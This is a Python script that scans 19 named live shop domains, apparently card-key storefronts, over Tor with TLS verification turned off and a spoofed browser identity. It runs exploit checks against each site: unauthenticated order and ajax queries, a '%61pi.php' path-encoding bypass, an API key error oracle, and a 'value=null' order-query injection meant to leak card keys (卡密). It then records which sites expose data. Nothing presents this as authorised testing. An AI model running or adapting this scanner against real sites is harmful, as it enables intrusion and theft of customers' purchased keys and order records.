#!/usr/bin/env python3
"""Batch SUCCESS_CASES first-pass for 19 shops."""
import json
import re
import socket
import subprocess
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from pathlib import Path

import requests

OUT = Path("/data/recon/batch19")
(OUT / "probe").mkdir(parents=True, exist_ok=True)
(OUT / "dump").mkdir(parents=True, exist_ok=True)

TARGETS = [
    "http://xuxin66.top/shop/",
    "https://tianyu9080.top/shop/",
    "https://yujuqq.top/shop/",
    "https://xinhe001.lol/shop/",
    "http://xq0809.top/shop/",
    "http://naimaoqq.top/shop/",
    "http://daya999.top/shop/",
    "https://qw123.lol/shop/",
    "https://qq6666.top/shop/",
    "https://ymqq.lol/shop/",
    "https://kpba.shop/shop/",
    "https://kln166.lol/shop/",
    "https://o898.com/shop/",
    "http://qingtianqq1.top/shop/",
    "https://maomao888.top/shop/",
    "https://tszqq.lol/shop/",
    "https://jinyin1818.top/shop/",
    "https://xihongqq.top/shop/",
    "https://laok558.top/shop/",
]

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
PROXIES = {"http": "socks5h://127.0.0.1:9050", "https": "socks5h://127.0.0.1:9050"}


def log(*a):
    print(*a, flush=True)


def host_of(url: str) -> str:
    return urllib.parse.urlparse(url).hostname


def api_base(url: str) -> str:
    """Prefer https for API even if listed as http."""
    p = urllib.parse.urlparse(url.rstrip("/"))
    scheme = "https"
    return f"{scheme}://{p.hostname}{p.path}".rstrip("/")


def dns_ips(host: str):
    try:
        return sorted(set(x[4][0] for x in socket.getaddrinfo(host, None)))
    except Exception as e:
        return [f"err:{e}"]


def session(origin: str, referer: str):
    s = requests.Session()
    s.proxies.update(PROXIES)
    s.verify = False
    requests.packages.urllib3.disable_warnings()
    s.headers.update(
        {
            "User-Agent": UA,
            "Accept-Language": "zh-CN,zh;q=0.9",
            "Origin": origin,
            "Referer": referer,
        }
    )
    return s


def get(s, url, timeout=25, **kw):
    try:
        r = s.get(url, timeout=timeout, allow_redirects=True, **kw)
        return r.status_code, r.text, r.url
    except Exception as e:
        return None, str(e), url


def curl61(base_https: str, qs: str) -> str:
    host = urllib.parse.urlparse(base_https).hostname
    url = f"{base_https}/%61pi.php?{qs}"
    cmd = [
        "curl", "-sS", "-m", "18", "-L",
        "-x", "socks5h://127.0.0.1:9050",
        "-A", UA,
        "-H", f"Origin: https://{host}",
        "-H", f"Referer: {base_https}/",
        url,
    ]
    p = subprocess.run(cmd, capture_output=True, text=True, timeout=25)
    return (p.stdout or p.stderr or "")[:300]


def probe_one(url: str) -> dict:
    host = host_of(url)
    origin = f"https://{host}"
    base_list = url.rstrip("/")
    base_https = api_base(url)
    row = {
        "target": url,
        "host": host,
        "ips": dns_ips(host),
        "cases": {},
        "interesting": [],
        "kami_hint": False,
    }
    s = session(origin, base_list + "/")

    # home (try given URL, then https variant)
    code, text, final = get(s, base_list + "/", timeout=40)
    if code in (None, 404) or (text and len(text) < 300):
        code2, text2, final2 = get(s, base_https + "/", timeout=40)
        if code2 == 200 and text2 and len(text2) > len(text or ""):
            code, text, final = code2, text2, final2
            base_list = base_https

    title = (re.search(r"<title>([^<]+)", text or "") or [None, None])[1]
    row["home"] = {
        "code": code,
        "final": final,
        "len": len(text or ""),
        "title": title,
        "rainbow": any(x in (text or "") for x in ["mod=buy", "mod=query", "hashsalt", "assets/js/csrf.js"]),
        "ykfaka": any(x in (text or "") for x in ["Query.html", "YKFAKA", "Query_Km"]),
        "tg": sorted(set(re.findall(r"t\.me/[\w]+|@[A-Za-z][\w]{3,}", text or "")))[:12],
    }
    safe = re.sub(r"[^a-zA-Z0-9._-]+", "_", url)
    if text and len(text) > 500:
        (OUT / "probe" / f"home_{safe}.html").write_text(text, encoding="utf-8")

    # getcount + ajax query on working base
    shop = base_https if (code == 200 or "shop" in (final or "")) else base_list
    # prefer https shop path
    shop = base_https
    s.headers["Referer"] = shop + "/"
    s.headers["Origin"] = origin

    c, t, _ = get(
        s,
        shop + "/ajax.php?act=getcount",
        headers={"X-Requested-With": "XMLHttpRequest"},
        timeout=25,
    )
    row["cases"]["getcount"] = {"code": c, "body": (t or "")[:300]}
    try:
        j = json.loads(t)
        row["cases"]["getcount"]["json"] = j
        if isinstance(j, dict) and j.get("code") == 0:
            row["yxts"] = j.get("yxts")
            row["orders"] = j.get("orders")
    except Exception:
        pass

    c, t, _ = get(
        s,
        shop + "/ajax.php?act=query&page=1",
        headers={"X-Requested-With": "XMLHttpRequest"},
        timeout=25,
    )
    row["cases"]["ajax_query"] = {"code": c, "body": (t or "")[:400]}
    if t and '"data":[{' in t:
        row["interesting"].append("ajax_query_has_data")
        row["kami_hint"] = True
    elif c == 200 and '"data":[]' in (t or ""):
        row["ajax_empty"] = True

    # qd93
    c, t, _ = get(s, shop + "/?mod=query&data=1", timeout=35)
    hits = []
    for pat in [r"showOrder", r"mod=faka", r"没有查询到", r"卡密[^<]{0,60}", r"查询结果"]:
        m = re.search(pat, t or "", re.I)
        if m:
            hits.append(m.group(0)[:80])
    row["cases"]["qd93"] = {"code": c, "len": len(t or ""), "hits": hits}
    if "showOrder" in (t or "") or "mod=faka" in (t or ""):
        row["interesting"].append("qd93_possible")
        row["kami_hint"] = True

    # %61pi via curl (stable)
    api = {}
    for label, qs in [
        ("search", "act=search&id=1"),
        ("tools_empty", "act=tools&key="),
        ("tools_bad", "act=tools&key=123456&limit=1"),
        ("goodslist", "act=goodslist"),
    ]:
        body = curl61(shop, qs)
        api[label] = body
        time.sleep(0.25)
    row["cases"]["api61"] = api
    if "请提供用户登录信息或API对接密钥" in api.get("search", ""):
        row["api_search_auth"] = True
    elif "订单不存在" in api.get("search", ""):
        row["api_search_open"] = True
        row["interesting"].append("api_search_open")
    elif api.get("search") and "code\":0" in api["search"] and "data" in api["search"] and "null" not in api["search"][:80]:
        row["interesting"].append("api_search_data")
        row["kami_hint"] = True
    if "确保各项不能为空" in api.get("tools_empty", "") and "错误" in api.get("tools_bad", ""):
        row["tools_oracle"] = True

    # YKFAKA null quick
    for root in [shop, re.sub(r"/shop$", "", shop)]:
        c, t, _ = get(s, root + "/Query.html", timeout=12)
        if c == 200 and t and ("Query_Km" in t or "ddid" in t.lower()):
            row["interesting"].append("yk_query_html")
            row["kami_hint"] = True
        try:
            r = s.post(
                root + "/index.php?m=Home&c=Order&a=query",
                data={"value": "null"},
                timeout=18,
            )
            km = len(re.findall(r"Query_Km", r.text))
            if km:
                row["interesting"].append("yk_null_live")
                row["kami_hint"] = True
                row["cases"]["yk_null"] = {"root": root, "km": km, "len": len(r.content)}
        except Exception:
            pass

    log(
        "DONE",
        url,
        "|",
        (title or "")[:36],
        "| yxts=",
        row.get("yxts"),
        "orders=",
        row.get("orders"),
        "| ajax=",
        row["cases"]["ajax_query"].get("code"),
        "| search=",
        (api.get("search") or "")[:50].replace("\n", " "),
        "| interest=",
        row["interesting"],
        "| kami=",
        row["kami_hint"],
    )
    return row


def main():
    results = []
    with ThreadPoolExecutor(max_workers=2) as ex:
        futs = {ex.submit(probe_one, u): u for u in TARGETS}
        for fut in as_completed(futs):
            u = futs[fut]
            try:
                results.append(fut.result())
            except Exception as e:
                log("FAIL", u, e)
                results.append({"target": u, "error": str(e)})

    order = {u: i for i, u in enumerate(TARGETS)}
    results.sort(key=lambda r: order.get(r.get("target"), 999))

    summary = []
    for r in results:
        summary.append(
            {
                "target": r.get("target"),
                "title": (r.get("home") or {}).get("title"),
                "ips": r.get("ips"),
                "yxts": r.get("yxts"),
                "orders": r.get("orders"),
                "ajax_query_code": (r.get("cases") or {}).get("ajax_query", {}).get("code"),
                "api_search": ((r.get("cases") or {}).get("api61", {}) or {}).get("search", "")[:80],
                "tools_oracle": r.get("tools_oracle"),
                "interesting": r.get("interesting"),
                "kami_hint": r.get("kami_hint"),
                "tg": (r.get("home") or {}).get("tg"),
            }
        )

    (OUT / "dump" / "BATCH.json").write_text(
        json.dumps(results, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    (OUT / "dump" / "SUMMARY.json").write_text(
        json.dumps(summary, ensure_ascii=False, indent=2), encoding="utf-8"
    )
    log("==== SUMMARY ====")
    for s in summary:
        log(
            s["target"],
            "| yxts=",
            s.get("yxts"),
            "orders=",
            s.get("orders"),
            "| ajax=",
            s.get("ajax_query_code"),
            "| interest=",
            s.get("interesting"),
            "| kami=",
            s.get("kami_hint"),
        )
    log("WROTE")


if __name__ == "__main__":
    main()
